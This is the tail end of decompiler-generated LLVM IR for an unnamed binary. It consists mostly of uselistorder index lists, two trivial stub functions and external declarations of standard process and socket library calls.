1273, 1274, 671, 670, 669, 249, 672, 410, 940, 941, 404, 942, 673, 342, 346, 341, 343, 345, 347, 344, 943, 445, 508, 509, 510, 511, 1018, 674, 88, 411, 919, 675, 24, 26, 27, 25, 28, 111, 110, 1048, 395, 446, 1049, 677, 676, 44, 45, 48, 46, 47, 678, 281, 277, 283, 279, 278, 280, 282, 679, 285, 287, 286, 289, 288, 284, 680, 681, 682, 684, 683, 1313, 447, 687, 686, 685, 349, 348, 688, 299, 300, 298, 301, 302, 303, 304, 305, 689, 118, 119, 117, 116, 690, 691, 381, 380, 448, 1277, 692, 186, 187, 512, 513, 406, 696, 695, 694, 693, 306, 424, 697, 350, 698, 115, 699, 68, 700, 113, 701, 67, 702, 351, 703, 57, 704, 181, 514, 1189, 407, 1190, 1191, 515, 1210, 708, 707, 706, 705, 182, 184, 185, 183, 709, 710, 1235, 1236, 352, 712, 711, 354, 355, 353, 1314, 713, 1224, 1225, 1226, 1227, 3, 1066, 1067, 1068, 1069, 982, 983, 714, 356, 1246, 1247, 1248, 1249, 1250, 1251, 1252, 425, 984, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 204, 202, 203, 205, 206, 1253, 397, 56, 55, 54, 426, 1254, 1019, 1020, 1021, 1022, 129, 128, 1134, 1133, 893, 894, 895, 896, 897, 898, 899, 1318, 31, 32, 29, 30, 985, 34, 33, 516, 715, 1162, 1159, 1160, 1161, 398, 427, 36, 37, 35, 39, 38, 1146, 1150, 1151, 1152, 1153, 1154, 716, 292, 290, 293, 291, 294, 295, 449, 1147, 1148, 517, 1149, 718, 717, 188, 189, 190, 720, 719, 236, 722, 721, 132, 131, 922, 724, 723, 252, 251, 461, 986, 519, 987, 988, 450, 451, 989, 990, 520, 991, 993, 994, 995, 521, 997, 452, 998, 996, 518, 999, 522, 1000, 462, 1001, 1002, 992, 728, 727, 726, 725, 253, 259, 256, 260, 255, 254, 263, 261, 262, 257, 258, 1003, 729, 357, 362, 358, 360, 361, 359, 730, 248, 247, 1004, 1005, 1006, 731, 195, 196, 463, 412, 1008, 413, 1009, 453, 1010, 1011, 1013, 399, 1014, 523, 1015, 414, 1012, 454, 739, 738, 737, 736, 735, 734, 733, 732, 219, 222, 221, 223, 220, 524, 428, 740, 69, 70, 71, 1007, 477, 567, 741, 742, 363, 525, 920, 921, 743, 366, 364, 365, 1315, 478, 1316, 1317, 744, 368, 367, 1163, 1164, 1165, 1166, 1167, 1168, 1169, 1170, 1171, 526, 1172, 1173, 1174, 1175, 429, 1176, 747, 746, 745, 371, 370, 369, 373, 372, 749, 748, 750, 1124, 1125, 1126, 1127, 1128, 753, 752, 751, 133, 134, 1262, 754, 51, 755, 49, 756, 40, 41, 757, 374, 758, 227, 759, 212, 760, 375, 761, 297, 200, 762, 376, 296, 763, 191, 764, 382, 765, 766, 767, 377, 768, 378, 769, 233, 770, 379, 387, 228, 479, 1213, 1214, 480, 1278, 1279, 393, 1280, 923, 400, 415, 924, 925, 926, 394, 529, 927, 928, 929, 930, 931, 932, 933, 934, 527, 528, 468, 530, 935, 777, 776, 775, 774, 773, 772, 771, 936, 937, 784, 783, 782, 781, 780, 568, 779, 778, 938, 939, 786, 785, 531, 944, 945, 532, 533, 534, 788, 787, 535, 789, 536, 1016, 794, 793, 792, 791, 790, 796, 795, 1023, 573, 1030, 1031, 1032, 1033, 1034, 1035, 537, 801, 800, 799, 798, 797, 226, 225, 1036, 1037, 1038, 1039, 1040, 538, 1041, 1042, 1043, 1044, 808, 807, 806, 805, 804, 803, 802, 235, 234, 1045, 814, 813, 812, 811, 810, 809, 1050, 900, 901, 540, 902, 539, 903, 904, 892, 1051, 1052, 823, 822, 821, 820, 819, 818, 817, 816, 815, 232, 231, 230, 541, 542, 827, 826, 825, 824, 485, 1211, 828, 42, 43, 830, 829, 4, 543, 1212, 457, 832, 831, 1215, 834, 833, 481, 1216, 544, 545, 1218, 1217, 546, 837, 836, 835, 486, 1219, 1220, 547, 548, 549, 1228, 569, 1221, 550, 838, 482, 551, 1222, 552, 1223, 844, 843, 842, 841, 840, 839, 487, 1229, 1230, 488, 845, 846, 1231, 553, 1232, 849, 848, 847, 851, 850, 455, 1237, 1238, 1239, 554, 401, 1240, 1241, 1242, 555, 1243, 855, 854, 853, 852, 570, 1244, 856, 201, 1245, 857, 556, 1255, 860, 859, 858, 1256, 571, 50, 490, 1263, 1264, 489, 1265, 1266, 491, 492, 1267, 1268, 861, 1269, 5, 6, 1272, 1270, 1271, 557, 865, 864, 863, 862, 1275, 1276, 867, 866, 871, 870, 869, 868, 874, 873, 872, 876, 875, 1281, 1282, 558, 1292, 1293, 458, 1294, 879, 878, 877, 469, 7, 883, 882, 881, 880, 431, 1283, 1284, 1285, 430, 1286, 1290, 1291, 559, 885, 884, 560, 1287, 1288, 1289, 887, 886, 112, 1295, 1296, 888, 572, 130, 432, 1297, 1298, 889, 383, 1299, 246, 890, 891, 386, 385, 384 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @call___do_global_ctors_aux() local_unnamed_addr {
entry:
  %v5_1a9b8 = load i32, i32* @r0, align 4
  ret i32 %v5_1a9b8

; uselistorder directives
  uselistorder i32* @r0, { 9, 10, 11, 60, 61, 62, 148, 12, 63, 13, 149, 8, 150, 151, 14, 192, 15, 199, 200, 201, 202, 205, 203, 204, 16, 64, 65, 206, 207, 7, 208, 209, 152, 153, 154, 210, 211, 218, 232, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 185, 186, 187, 188, 18, 19, 230, 21, 155, 156, 22, 157, 158, 159, 23, 297, 298, 299, 50, 289, 300, 301, 56, 57, 58, 59, 24, 25, 26, 27, 181, 182, 53, 302, 303, 90, 183, 36, 193, 194, 195, 196, 197, 198, 66, 67, 68, 69, 70, 277, 278, 305, 28, 29, 292, 30, 291, 74, 54, 75, 37, 293, 304, 184, 31, 265, 266, 267, 268, 269, 270, 271, 272, 17, 282, 45, 160, 161, 162, 20, 224, 225, 226, 227, 228, 229, 32, 219, 220, 221, 222, 76, 231, 77, 163, 164, 165, 3, 33, 166, 167, 4, 6, 0, 1, 168, 169, 5, 170, 171, 172, 34, 173, 174, 175, 2, 176, 146, 223, 71, 72, 73, 307, 308, 233, 234, 235, 236, 237, 238, 239, 240, 177, 178, 212, 213, 214, 215, 216, 217, 35, 44, 78, 306, 38, 51, 52, 39, 279, 40, 295, 41, 296, 43, 42, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 147, 179, 180, 189, 190, 191, 273, 274, 275, 276, 280, 281, 283, 284, 285, 286, 287, 288, 290, 294, 46, 47, 48, 49, 55 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_1a9c0 = load i32, i32* @r4, align 4
  %v0_1a9c8 = call i32 @__do_global_dtors_aux()
  call void @__pseudo_branch(i32 %v3_1a9c0)
  ret i32 %v0_1a9c8

; uselistorder directives
  uselistorder void (i32)* @__pseudo_branch, { 1, 19, 3, 4, 5, 6, 7, 13, 11, 12, 24, 25, 21, 22, 23, 0, 26, 14, 8, 15, 9, 10, 16, 17, 18, 2, 20 }
  uselistorder i32 0, { 0, 1736, 1, 1737, 1738, 1529, 370, 371, 1739, 1740, 1741, 1742, 2, 1743, 1744, 1745, 4, 5, 6, 1746, 1747, 3, 1748, 1749, 7, 1750, 1751, 47, 1530, 1752, 1753, 1754, 1755, 1756, 1757, 1758, 1759, 110, 109, 192, 193, 194, 1760, 1761, 1762, 1763, 1764, 1765, 48, 1766, 1767, 1768, 49, 50, 186, 1769, 1770, 1771, 1772, 51, 187, 383, 1773, 1774, 1775, 1776, 1777, 1778, 52, 1779, 9, 8, 53, 1531, 1780, 1533, 1532, 1781, 1782, 1783, 1784, 1785, 1786, 1787, 1788, 1789, 1790, 1791, 1792, 1793, 10, 1590, 1591, 1592, 1593, 1594, 1595, 384, 1794, 1534, 11, 1795, 385, 1596, 12, 1597, 1796, 1797, 1535, 13, 1798, 1799, 386, 15, 14, 1800, 1801, 1802, 1803, 1804, 1805, 1806, 1536, 1537, 1807, 1539, 1808, 1809, 1540, 1541, 1810, 1811, 1538, 1812, 1542, 1813, 1543, 1814, 1815, 1816, 1817, 54, 16, 2099, 2100, 2101, 2102, 135, 2103, 195, 2104, 2105, 2106, 2107, 2108, 2109, 2110, 196, 1544, 1547, 1545, 1546, 2111, 2112, 2113, 2114, 2115, 2116, 2127, 70, 114, 2128, 2129, 2130, 2131, 2132, 2133, 2142, 2143, 2134, 2135, 2136, 2137, 2138, 2139, 2140, 2141, 2144, 1548, 1818, 1819, 2156, 387, 388, 2147, 2148, 197, 2149, 2150, 2152, 2151, 2153, 2154, 317, 2155, 188, 189, 190, 2157, 2145, 2146, 101, 102, 2158, 2160, 2161, 2159, 2162, 2163, 2164, 2165, 127, 2166, 2167, 128, 2168, 129, 2169, 130, 2170, 200, 1598, 198, 1599, 1600, 1601, 199, 1602, 115, 116, 1603, 201, 1604, 389, 55, 390, 1605, 1606, 318, 202, 391, 392, 1607, 203, 2171, 2172, 2173, 2175, 204, 2174, 268, 393, 2176, 394, 71, 72, 73, 74, 150, 151, 205, 206, 2177, 152, 2178, 325, 324, 323, 17, 123, 75, 2053, 2179, 2180, 2054, 321, 1820, 207, 2181, 2182, 2183, 2184, 2185, 1821, 1822, 56, 1823, 1824, 153, 1825, 1826, 2186, 2187, 2188, 18, 2189, 2190, 1827, 208, 1828, 1829, 1830, 1831, 1832, 1833, 2191, 209, 326, 2192, 2199, 2200, 395, 2201, 2202, 2203, 2204, 2205, 2206, 2207, 2208, 76, 2210, 2209, 117, 2233, 2234, 396, 2268, 2254, 2255, 2256, 20, 19, 330, 315, 316, 322, 2257, 2258, 2260, 2261, 154, 263, 2263, 397, 2264, 2265, 21, 2266, 2267, 2269, 398, 331, 2262, 2259, 2270, 2271, 210, 2272, 2273, 22, 2349, 2350, 2351, 2352, 212, 211, 2353, 213, 2055, 2056, 23, 1549, 1834, 77, 155, 1835, 1836, 269, 24, 1550, 271, 1837, 78, 156, 1838, 1839, 270, 2430, 2431, 2432, 2433, 2436, 2437, 2438, 2439, 2440, 2441, 2442, 2443, 2434, 2435, 2444, 2445, 2446, 2447, 2448, 2449, 2450, 2451, 57, 2452, 2453, 2454, 2455, 58, 2456, 2457, 59, 2458, 2459, 60, 2460, 2461, 2462, 2463, 2464, 2465, 2466, 2467, 2468, 2469, 2470, 2471, 2472, 2473, 2476, 2477, 2478, 2479, 2480, 2481, 2482, 2483, 2474, 2475, 2484, 2485, 2486, 2487, 2488, 2489, 2490, 2491, 61, 2492, 2493, 2494, 2495, 62, 2496, 2497, 2498, 2499, 63, 2500, 2501, 2502, 2503, 2504, 2505, 2506, 2507, 2508, 2509, 2510, 2511, 2211, 2212, 2226, 399, 400, 2227, 2228, 1840, 1841, 1842, 1843, 1844, 1845, 1846, 1847, 1848, 1849, 1850, 1851, 1852, 1853, 1854, 214, 1855, 1856, 1857, 1858, 1859, 1860, 1861, 1862, 1863, 1864, 1865, 1866, 1867, 1868, 1869, 1870, 64, 1871, 1872, 1873, 1874, 1875, 1876, 1877, 157, 126, 1878, 1879, 215, 216, 1880, 1881, 1882, 1883, 217, 1884, 1885, 1886, 1887, 1888, 1889, 1890, 1891, 1892, 65, 1893, 1894, 1895, 1896, 1897, 1898, 1899, 1900, 1901, 319, 1902, 79, 218, 1903, 158, 401, 1904, 1905, 1906, 1907, 1908, 1909, 66, 1910, 1911, 1912, 1913, 1914, 1915, 1916, 402, 1917, 1918, 1919, 1920, 219, 1921, 1922, 1923, 1924, 1925, 1926, 1927, 1928, 1929, 220, 1930, 1524, 1931, 1932, 1933, 1525, 1934, 1935, 1936, 1937, 1938, 1939, 1940, 1941, 2325, 25, 2326, 2327, 2328, 1551, 2329, 2330, 2331, 2332, 2333, 2334, 1943, 1942, 1944, 1945, 1946, 1947, 1948, 1949, 1950, 1951, 1952, 1953, 1954, 1955, 1956, 1957, 1958, 159, 2213, 2214, 26, 2215, 272, 1959, 273, 1960, 1961, 160, 1962, 2362, 2378, 2379, 2380, 2381, 2079, 2512, 2513, 2514, 2515, 2365, 2516, 2366, 2517, 2518, 221, 2519, 133, 2520, 131, 132, 2521, 2522, 2523, 403, 404, 405, 2527, 406, 2538, 2543, 1552, 274, 2544, 407, 2542, 408, 409, 27, 2524, 2525, 410, 222, 2037, 332, 2038, 413, 334, 333, 2039, 2040, 2041, 2042, 412, 2043, 2044, 411, 2045, 2367, 223, 2526, 1665, 1666, 1667, 1668, 1669, 1670, 225, 161, 1671, 1672, 1673, 134, 224, 1674, 226, 2046, 2047, 414, 2052, 415, 1608, 162, 1609, 163, 1610, 227, 2117, 2118, 2119, 2120, 28, 2292, 2293, 29, 1611, 1612, 1553, 103, 1613, 372, 1614, 417, 2528, 418, 335, 2529, 2530, 2532, 2533, 416, 2384, 2386, 2387, 80, 275, 2388, 2385, 2382, 2383, 30, 1618, 1621, 1619, 1620, 276, 31, 2391, 2389, 2390, 277, 228, 1622, 1623, 1624, 1625, 2392, 2393, 419, 32, 2394, 229, 2395, 2396, 2397, 2398, 2399, 2400, 33, 34, 2048, 2049, 2050, 2051, 420, 35, 421, 2274, 2275, 1526, 2080, 1527, 2401, 2337, 2312, 1658, 2313, 2276, 2277, 230, 2278, 2282, 2283, 2284, 2285, 422, 2286, 2287, 2354, 231, 232, 2335, 423, 336, 2336, 2539, 233, 36, 234, 235, 1963, 1964, 237, 1965, 424, 236, 1966, 118, 37, 2342, 2343, 1967, 1968, 278, 38, 1969, 2279, 2280, 2281, 39, 2344, 2345, 2346, 40, 2545, 2546, 119, 238, 1970, 1971, 1972, 1973, 1974, 239, 2229, 1554, 2230, 148, 164, 2216, 2217, 2224, 2221, 2222, 2223, 279, 2225, 373, 2219, 2218, 280, 2220, 1626, 1627, 2231, 2232, 1628, 1629, 1975, 1976, 1977, 1978, 1979, 165, 1980, 1981, 1982, 1983, 1984, 240, 1985, 1987, 1988, 1986, 1989, 166, 1990, 1991, 241, 1992, 242, 320, 425, 1993, 1994, 243, 244, 1995, 1996, 1997, 1998, 1999, 2000, 337, 2001, 2002, 426, 2003, 338, 2005, 249, 2007, 246, 247, 2004, 245, 2006, 2008, 2010, 168, 2011, 2012, 250, 104, 105, 2013, 2014, 167, 427, 2015, 2016, 251, 428, 2017, 2018, 248, 2019, 2020, 2021, 2022, 2023, 2024, 2025, 2026, 2027, 2028, 429, 2030, 136, 111, 2029, 2031, 2032, 2033, 41, 1586, 252, 1587, 147, 106, 124, 2009, 281, 1732, 1733, 1734, 1615, 42, 283, 253, 1617, 1616, 282, 339, 2541, 2235, 2236, 2237, 107, 2238, 2239, 254, 2240, 2241, 2242, 2243, 2244, 2245, 2246, 2247, 2248, 2249, 2250, 2251, 2252, 191, 2034, 2253, 2193, 2194, 2195, 2196, 2197, 2198, 1555, 2402, 2121, 2531, 1630, 2338, 2360, 1631, 2368, 2534, 137, 2535, 2428, 2540, 2369, 2429, 1632, 2370, 1633, 1634, 1635, 1636, 1637, 1638, 1639, 1640, 1641, 1642, 2310, 2371, 2372, 1643, 2536, 2537, 43, 2294, 169, 2295, 2296, 265, 264, 1556, 138, 139, 140, 141, 1558, 1557, 82, 81, 170, 2297, 2298, 2299, 2300, 2302, 2301, 44, 2403, 2404, 267, 266, 1559, 142, 143, 144, 145, 1561, 1560, 84, 83, 69, 108, 2405, 1562, 45, 2406, 2407, 146, 2408, 2409, 2410, 2411, 2412, 255, 1563, 1566, 1564, 1565, 2413, 1567, 327, 435, 1644, 436, 284, 437, 1645, 434, 67, 68, 438, 1646, 1647, 439, 447, 448, 570, 571, 85, 340, 430, 431, 432, 341, 433, 1648, 285, 171, 441, 442, 440, 1649, 1650, 1651, 1652, 1654, 306, 1653, 1655, 1656, 445, 446, 443, 444, 1657, 256, 342, 286, 1660, 449, 1659, 451, 452, 450, 453, 454, 1661, 1662, 374, 1663, 455, 1664, 456, 86, 125, 172, 173, 174, 175, 176, 472, 1675, 343, 344, 457, 345, 1676, 1677, 469, 258, 1678, 1681, 470, 1679, 471, 259, 1680, 290, 1682, 473, 1683, 466, 257, 1684, 1687, 467, 1685, 468, 260, 1686, 289, 1688, 474, 1689, 463, 1690, 1693, 464, 1691, 465, 1692, 288, 1694, 1695, 460, 1696, 1699, 461, 1697, 462, 1698, 287, 1700, 459, 475, 1701, 1702, 476, 1703, 1706, 477, 1704, 478, 1705, 291, 1707, 458, 479, 1708, 1709, 480, 1710, 1711, 481, 1712, 1713, 1714, 482, 1715, 1716, 1717, 483, 1718, 1719, 1720, 484, 1721, 1722, 1723, 1724, 1725, 1726, 1727, 1728, 1729, 1730, 1731, 485, 486, 1735, 487, 261, 2035, 2036, 488, 490, 491, 489, 492, 493, 292, 2057, 328, 2058, 496, 2059, 87, 346, 2060, 2061, 2062, 2069, 495, 2063, 2064, 2065, 2066, 2067, 2068, 293, 2070, 497, 2071, 375, 2072, 2073, 494, 2074, 2075, 2076, 2077, 2078, 177, 2081, 499, 2082, 309, 88, 307, 308, 2083, 2084, 2085, 149, 376, 2086, 500, 2087, 498, 2088, 2089, 2090, 501, 2091, 312, 310, 89, 311, 2092, 2093, 502, 2094, 2095, 503, 2096, 2097, 2098, 347, 505, 506, 504, 507, 1568, 1569, 530, 1570, 1571, 1572, 1573, 529, 1574, 1575, 1576, 1577, 528, 1578, 1579, 1580, 1581, 525, 526, 508, 1582, 527, 524, 294, 295, 1583, 1584, 516, 1585, 517, 518, 519, 520, 521, 522, 523, 1528, 2122, 90, 121, 2123, 348, 2124, 509, 510, 511, 512, 513, 514, 515, 91, 112, 120, 531, 532, 2125, 533, 2126, 349, 350, 351, 2288, 377, 2289, 2290, 2291, 122, 178, 179, 92, 93, 534, 262, 2303, 352, 353, 354, 355, 541, 2304, 2306, 2307, 2308, 536, 2309, 537, 538, 539, 535, 296, 540, 2305, 378, 543, 544, 542, 356, 46, 546, 545, 547, 2311, 357, 358, 359, 360, 2314, 2315, 550, 548, 549, 297, 2316, 2317, 2318, 379, 313, 2322, 2323, 361, 2319, 2320, 551, 552, 553, 2321, 555, 556, 557, 558, 559, 554, 298, 560, 2324, 561, 94, 567, 95, 566, 562, 2339, 565, 300, 568, 563, 2340, 564, 299, 569, 96, 113, 2341, 362, 572, 573, 574, 2348, 575, 2347, 577, 578, 576, 579, 580, 2355, 2356, 380, 2357, 2358, 180, 2359, 97, 381, 2361, 301, 581, 582, 583, 584, 2363, 2364, 329, 2373, 2374, 585, 2375, 586, 2376, 2377, 587, 181, 588, 589, 590, 591, 592, 2424, 182, 98, 314, 302, 365, 366, 2414, 2415, 2416, 303, 363, 364, 367, 2417, 2418, 368, 2419, 2420, 305, 99, 183, 184, 304, 2422, 2423, 382, 185, 100, 593, 2421, 2425, 2426, 369, 2427, 1588, 1589, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 1161, 1162, 1163, 1164, 1165, 1166, 1167, 1168, 1169, 1170, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 1213, 1214, 1215, 1216, 1217, 1218, 1219, 1220, 1221, 1222, 1223, 1224, 1225, 1226, 1227, 1228, 1229, 1230, 1231, 1232, 1233, 1234, 1235, 1236, 1237, 1238, 1239, 1240, 1241, 1242, 1243, 1244, 1245, 1246, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 1254, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 1282, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 1296, 1297, 1298, 1299, 1300, 1301, 1302, 1303, 1304, 1305, 1306, 1307, 1308, 1309, 1310, 1311, 1312, 1313, 1314, 1315, 1316, 1317, 1318, 1319, 1320, 1321, 1322, 1323, 1324, 1325, 1326, 1327, 1328, 1329, 1330, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 1338, 1339, 1340, 1341, 1342, 1343, 1344, 1345, 1346, 1347, 1348, 1349, 1350, 1351, 1352, 1353, 1354, 1355, 1356, 1357, 1358, 1359, 1360, 1361, 1362, 1363, 1364, 1365, 1366, 1367, 1368, 1369, 1370, 1371, 1372, 1373, 1374, 1375, 1376, 1377, 1378, 1379, 1380, 1381, 1382, 1383, 1384, 1385, 1386, 1387, 1388, 1389, 1390, 1391, 1392, 1393, 1394, 1395, 1396, 1397, 1398, 1399, 1400, 1401, 1402, 1403, 1404, 1405, 1406, 1407, 1408, 1409, 1410, 1411, 1412, 1413, 1414, 1415, 1416, 1417, 1418, 1419, 1420, 1421, 1422, 1423, 1424, 1425, 1426, 1427, 1428, 1429, 1430, 1431, 1432, 1433, 1434, 1435, 1436, 1437, 1438, 1439, 1440, 1441, 1442, 1443, 1444, 1445, 1446, 1447, 1448, 1449, 1450, 1451, 1452, 1453, 1454, 1455, 1456, 1457, 1458, 1459, 1460, 1461, 1462, 1463, 1464, 1465, 1466, 1467, 1468, 1469, 1470, 1471, 1472, 1473, 1474, 1475, 1476, 1477, 1478, 1479, 1480, 1481, 1482, 1483, 1484, 1485, 1486, 1487, 1488, 1489, 1490, 1491, 1492, 1493, 1494, 1495, 1496, 1497, 1498, 1499, 1500, 1501, 1502, 1503, 1504, 1505, 1506, 1507, 1508, 1509, 1510, 1511, 1512, 1513, 1514, 1515, 1516, 1517, 1518, 1519, 1520, 1521, 1522, 1523, 2547, 2548, 2549, 2550, 2551, 2552, 2553, 2554, 2555, 2556, 2557, 2558, 2559, 2560, 2561 }
  uselistorder i32* @r4, {}
}

declare i32 @vfork() local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i8 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8** @__decompiler_undefined_function_3() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
